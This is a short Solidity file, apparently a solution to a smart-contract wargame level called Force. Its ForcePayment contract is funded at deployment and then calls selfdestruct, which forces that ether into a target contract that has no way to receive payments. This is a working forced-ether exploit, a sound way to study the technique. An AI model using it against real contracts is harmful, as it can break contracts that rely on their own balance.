// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForcePayment {
    Force private force;

    constructor(address foreceContractAdress) payable{
        force = Force(foreceContractAdress);
    }

    function exec() public {
        address payable target = payable(address(force));
        selfdestruct(target);
    }
}
